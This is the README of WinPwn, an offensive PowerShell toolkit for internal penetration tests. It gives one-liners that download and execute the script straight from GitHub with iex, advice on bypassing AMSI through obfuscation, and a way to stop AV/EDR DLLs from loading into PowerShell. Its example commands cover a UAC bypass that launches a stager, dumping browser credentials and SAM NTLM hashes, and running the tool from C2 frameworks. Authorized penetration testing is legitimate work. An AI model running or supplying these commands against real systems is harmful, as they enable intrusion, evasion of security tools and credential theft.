# WinPwn
In many past internal penetration tests I often had problems with the existing Powershell Recon / Exploitation scripts due to missing proxy support. I also often ran the same scripts one after the other to get information about the current system and/or the domain. To automate as many internal penetration test processes (reconnaissance as well as exploitation) and for the proxy reason I wrote my own script with automatic proxy recognition and integration. 
The script is mostly based on well-known large other offensive security Powershell projects.

Any suggestions, feedback, Pull requests and comments are welcome! 

Just Import the Modules with:

`Import-Module .\WinPwn.ps1` or 
`iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1')`

To bypass AMSI take one of the existing [bypass techniques](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), find the AMSI [trigger](https://github.com/RythmStick/AMSITrigger) and manually change it in the bypass function or encode the trigger string. Alternatively obfuscate the whole script. 

To spawn a new protected PowerShell Process that is set to run with BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON process mitigation:

`iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/Obfus_SecurePS_WinPwn.ps1')`

This prevents non-microsoft DLLs (e.g. AV/EDR products) to load into PowerShell - unless they have a Cross-Signed Microsoft certificate.

If you find yourself stuck on a windows system with no internet access - no problem at all, just use `Offline_Winpwn.ps1`, the most important scripts and executables are included.

Without parameters, most of the functions can only be used from an interactive shell. So i decided to add the parameters `-noninteractive` and `-consoleoutput` to make the script usable from 
an asynchronous C2-Framework like Empire, Covenant, Cobalt Strike or others. They can be used as follows:

Usage: 

  -noninteractive 	-> No questions for functions so that they run with predefined or user defined parameters  
            
  -consoleoutput    -> The loot/report folders are not created. Every function returns the output to the console 
				    so that you can take a look at everything in the Agent logs of your C2-Framework 
Examples:

`WinPwn -noninteractive -consoleoutput -DomainRecon` 	-> This will return every single domain recon script and 
														   function and will probably give you really much output

`WinPwn -noninteractive -consoleoutput -Localrecon` 	-> This will enumerate as much information for the local
														   system as possible
														   
`Generalrecon -noninteractive`							-> Execute basic local recon functions and store the output
														   in the corresponding folders

`UACBypass -noninteractive -command "C:\temp\stager.exe" -technique ccmstp`	-> Execute a stager in  a high integrity 
																			   process from a low privileged session
																			   
`Kittielocal -noninteractive -consoleoutput -browsercredentials`			-> Dump Browser-Credentials via Sharpweb
																			   returning the output to console
																			   
`Kittielocal -noninteractive -browsercredentials`								-> Dump SAM File NTLM-Hashes and store
																			   the output in a file
																			   
`WinPwn -PowerSharpPack -consoleoutput -noninteractive`					    -> Execute Seatbelt, PowerUp, Watson and 
																			   more C# binaries in memory
																			   
`Dotnetsearch -consoleoutput -noninteractive`						    -> Search in `C:\Program Files\` and `C:\Program Files (x86)\` for .NET assemblies
